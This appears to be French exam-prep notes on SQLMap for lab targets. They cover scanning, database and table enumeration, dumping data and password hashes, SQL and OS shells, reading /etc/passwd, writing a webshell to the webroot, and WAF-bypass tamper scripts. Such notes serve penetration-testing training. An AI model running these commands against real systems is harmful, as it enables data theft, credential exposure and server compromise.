# SQL Injection (SQLMap)

```bash
# Détection agressive
--level 5 --risk 3

# Dump la base si vulnérable
--dbs

# Dump une table spécifique
-D nom_db -T users --dump

# Évite les questions interactives
--batch

# Threads pour aller plus vite
--threads 10

# Teste seulement certains types d'injection
--technique=BEUSTQ  # Boolean, Error, Union, Stacked, Time, Query
```

## 1. SQLMap - Commandes Basiques

### 1.1 Scan GET simple :

```bash
sqlmap -u "http://sql-sandbox/api?id=1" --dbs
```

**Options :**

- `-u <URL>` : URL à tester
- `--dbs` : Liste toutes les bases de données

---

### 1.2 Scan POST avec data :

```bash
sqlmap -u http://sql-sandbox/sqlmap/api \
  --method POST \
  --data "db=mysql&name=taco&sort=id&order=asc" \
  -p "name,sort,order"
```

**Options :**

- `--method POST` : Méthode HTTP
- `--data "..."` : Body de la requête POST
- `-p "name,sort,order"` : Paramètres à tester (focus sur ces params)

---

### 1.3 SQLMap avec multipart/form-data

#### 1.3.1. 1ère méthode avec fichier 
Sauvegarder la requête dans un fichier  
dans Burp -> clic droit sur la requête ->Copy to file -> file.txt  
AJOUTER UN * APRES LA VALEUR A TESTER   
ou créer manuellement , exemple :
```bash
POST /auth HTTP/1.1
Host: piano
Content-Type: multipart/form-data; boundary=----geckoformboundary4b48bf8238a41a9679cf890c2b7ae8c4

------geckoformboundary4b48bf8238a41a9679cf890c2b7ae8c4
Content-Disposition: form-data; name="_token"

q2Fn1UJt1sUevJfhaoi7j1kHWmbKRR1uJtGMQKtI
------geckoformboundary4b48bf8238a41a9679cf890c2b7ae8c4
Content-Disposition: form-data; name="username"

username*
------geckoformboundary4b48bf8238a41a9679cf890c2b7ae8c4
Content-Disposition: form-data; name="password"

password
------geckoformboundary4b48bf8238a41a9679cf890c2b7ae8c4
Content-Disposition: form-data; name="dType"

test
------geckoformboundary4b48bf8238a41a9679cf890c2b7ae8c4--
```
**SQLMap**
```bash
# Test le paramètre username (avec l'astérisque)
sqlmap -r piano-auth.txt --batch --risk 3 --level 5

# Ou teste TOUS les paramètres
sqlmap -r piano-auth.txt --batch --risk 3 --level 5 -p username,password,dType

# Si tu veux cibler un seul paramètre
sqlmap -r piano-auth.txt --batch -p username
```

#### 1.3.2. 2nde méthode en ligne de commande
```bash
sqlmap -u "http://piano/auth" \
  --data="username=admin&password=test&dType=test&_token=q2Fn1UJt1sUevJfhaoi7j1kHWmbKRR1uJtGMQKtI" \
  --cookie="PHPSESSID=c024c4fe8ba9ce2fde34fd74615ac946" \
  -p username \
  --batch
```


---

### 1.4 Spécifier SGBD :

```bash
sqlmap -u http://target/api \
  --method POST \
  --data "db=mysql&name=test" \
  -p "name" \
  --dbms=mysql
```

**Options :**

- `--dbms=mysql` : Force le type de base (mysql, postgres, mssql, oracle)
- Accélère scan, évite tests inutiles

**SGBD supportés :**

- `mysql`, `postgresql`, `mssql`, `oracle`, `sqlite`, `access`, `db2`, `firebird`, `sybase`, `hsqldb`

---

### 1.5 Ignorer sessions précédentes :

```bash
sqlmap -u http://target/api \
  --data "db=mysql&name=test" \
  --flush-session
```

**Options :**

- `--flush-session` : Ignore cache/sessions antérieures
- **Très important** pour SQL Sandbox (plusieurs SGBD)

---

### 1.6 Mode batch (pas d'interaction) :

```bash
sqlmap -u http://target/api --batch
```

**Options :**

- `--batch` : Never ask for user input, use default behavior
- Utile pour automatisation

---

### 1.7 Random User-Agent :

```bash
sqlmap -u http://target/api --random-agent
```

**Options :**

- `--random-agent` : Use randomly selected HTTP User-Agent

---

### 1.8 Threads (parallélisation) :

```bash
sqlmap -u http://target/api --threads 10
```

**Options :**

- `--threads MAX` : Max number of concurrent requests (défaut: 1)

---

### 1.9 Cookies :

```bash
sqlmap -u http://target/api --cookie "session=abc123"
```

**Options :**

- `--cookie COOKIE` : HTTP Cookie header value

---

### 1.10 Headers personnalisés :

```bash
sqlmap -u http://target/api --headers "Authorization: Bearer token"
```

**Options :**

- `--headers HEADERS` : Extra headers (newline separated)

---

### 1.11 Proxy :

```bash
sqlmap -u http://target/api --proxy http://127.0.0.1:8080
```

**Options :**

- `--proxy PROXY` : Use a proxy to connect to the target URL

---

## 2 SQLMap - Énumération

### 2.1 Lister bases de données : `--dbms=mysql --dbs`

```bash
sqlmap -u http://target/api \
  --method POST \
  --data "db=mssql&name=test" \
  -p "name" \
  --dbms=mssql \
  --dbs \
  --flush-session
```

**Résultat exemple :**

```
[*] app
[*] exercise
[*] master
[*] sqlmap
[*] tempdb
```

---

### 2.2 Base de données courante :

```bash
sqlmap -u http://target/api --current-db
```

**Options :**

- `--current-db` : Retrieve DBMS current database

---

### 2.3 Utilisateur courant :

```bash
sqlmap -u http://target/api --current-user
```

**Options :**

- `--current-user` : Retrieve DBMS current user

---

### 2.4 Vérifier si DBA :

```bash
sqlmap -u http://target/api --is-dba
```

**Options :**

- `--is-dba` : Check if current user is DBA

---

### 2.5 Lister tables d'une base :

```bash
sqlmap -u http://target/api \
  --data "db=mssql&name=test" \
  -p "name" \
  --dbms=mssql \
  -D sqlmap \
  --tables \
  --flush-session
```

**Options :**

- `-D sqlmap` : Spécifie la base de données
- `--tables` : Liste les tables

**Résultat exemple :**

```
+-------+
| flags |
| menu  |
| users |
+-------+
```

---

### 2.6 Lister colonnes d'une table :

```bash
sqlmap -u http://target/api \
  --data "db=mssql&name=test" \
  -p "name" \
  --dbms=mssql \
  -D sqlmap \
  -T flags \
  --columns \
  --flush-session
```

**Options :**

- `-T flags` : Spécifie la table
- `--columns` : Liste les colonnes

**Résultat exemple :**

```
+--------+---------+
| Column | Type    |
+--------+---------+
| flag   | varchar |
| id     | int     |
+--------+---------+
```

---

### 2.7 Dumper colonnes spécifiques :

```bash
sqlmap -u http://target/api \
  --data "db=mssql&name=test" \
  -p "name" \
  --dbms=mssql \
  -D sqlmap \
  -T flags \
  -C flag,id \
  --dump \
  --flush-session
```

**Options :**

- `-C flag,id` : Colonnes à extraire
- `--dump` : Extrait les données

**Résultat exemple :**

```
+------------------------------+------+
| flag                         | id   |
+------------------------------+------+
| OS{secretSQLmapFlagForMSSQL} | 1000 |
+------------------------------+------+
```

---

### 2.8 Dump toute la base :

```bash
sqlmap -u http://target/api \
  --data "db=mysql&name=test" \
  -p "name" \
  --dbms=mysql \
  --dump \
  --flush-session
```

**Options :**

- `--dump` : Dump TOUTES les tables de la base courante

---

### 2.9 Dump TOUTES les bases :

```bash
sqlmap -u http://target/api --dump-all
```

**Options :**

- `--dump-all` : Dump all DBMS databases tables entries
- **Attention** : Très long !

---

### 2.10 Dump passwords (hashes) :

```bash
sqlmap -u http://target/api --passwords
```

**Options :**

- `--passwords` : Enumerate DBMS users password hashes

---

## 3 SQLMap - Exploitation Avancée

### 3.1 Shell SQL interactif :

```bash
sqlmap -u http://target/api --sql-shell
```

**Options :**

- `--sql-shell` : Prompt for an interactive SQL shell

---

### 3.2 Shell OS (si écriture possible) :

```bash
sqlmap -u http://target/api --os-shell
```

**Conditions :**

- DB peut écrire dans webroot
- App en ASP/ASPX/JSP/PHP
- Peut être lent mais efficace

---

### 3.3 Lire fichier sur serveur :

```bash
sqlmap -u http://target/api --file-read "/etc/passwd"
```

**Options :**

- `--file-read FILENAME` : Read a file from the back-end DBMS file system

---

### 3.4 Écrire fichier sur serveur :

```bash
sqlmap -u http://target/api \
  --file-write "/local/webshell.php" \
  --file-dest "/var/www/html/shell.php"
```

**Options :**

- `--file-write LOCAL` : Write a local file on the back-end DBMS file system
- `--file-dest REMOTE` : Remote file absolute filepath

---

### 3.5 Techniques SQL injection :

```bash
sqlmap -u http://target/api --technique=BEUST
```

**Options :**

- `--technique TECH` : SQL injection techniques to use
    - `B` : Boolean-based blind
    - `E` : Error-based
    - `U` : Union query-based
    - `S` : Stacked queries
    - `T` : Time-based blind
    - `Q` : Inline queries

**Exemples :**

```bash
# Seulement time-based
sqlmap -u http://target/api --technique=T

# Union + Error based
sqlmap -u http://target/api --technique=UE
```

---

### 3.6 Tamper scripts (WAF bypass) :

```bash
# Espace → commentaire
sqlmap -u http://target/api --tamper=space2comment

# Multiple tampers
sqlmap -u http://target/api --tamper=space2comment,between

sqlmap -r solar.txt --dbms=mssql -p patientName --dbs \
  --tamper=space2comment,between \
  --random-agent \
  --delay=2
```

**Options :**

- `--tamper SCRIPT` : Use given script(s) for tampering injection data

**Tampers courants :**

- `space2comment` : Remplace espaces par `/**/`
- `between` : Remplace `>` par `NOT BETWEEN 0 AND #`
- `apostrophemask` : Remplace `'` par UTF-8
- `base64encode` : Encode en base64

**Lister tampers disponibles :**

```bash
sqlmap --list-tampers
```

---

### 3.7 Level et Risk :

```bash
sqlmap -u http://target/api --level=5 --risk=3
```

**Options :**

- `--level LEVEL` : Level of tests to perform (1-5, défaut: 1)
    - 1 : Basic tests
    - 2-5 : Plus de payloads, plus de vecteurs
- `--risk RISK` : Risk of tests to perform (1-3, défaut: 1)
    - 1 : Safe
    - 2 : Medium (time-based)
    - 3 : Heavy queries (OR, UPDATE, DELETE)

**Recommandation :**

- Level 5 + Risk 3 = Maximum de tests (très long)
- Pour exam : Level 3-4 + Risk 2

---

## 4 SQLMap - Workflow Complet

### 4.1 Méthodologie recommandée :

**Identifier vulnérabilité + SGBD :**

```bash
sqlmap -u http://target/api --data "..." -p "param"
```

**Lister bases :**

```bash
sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql --dbs --flush-session
```

**Lister tables :**

```bash
sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql -D nom_base --tables --flush-session
```

**Lister colonnes :**

```bash
sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql -D nom_base -T nom_table --columns --flush-session
```

**Dump données :**

```bash
sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql -D nom_base -T nom_table -C col1,col2 --dump --flush-session
```

---

### 4.2 Depuis requête Burp :

```bash
# Sauvegarder requête HTTP depuis Burp
# Copy to file → request.txt

sqlmap -r request.txt -p param_name --dbms=mysql --dbs
```

**Options :**

- `-r REQUESTFILE` : Load HTTP request from a file

---
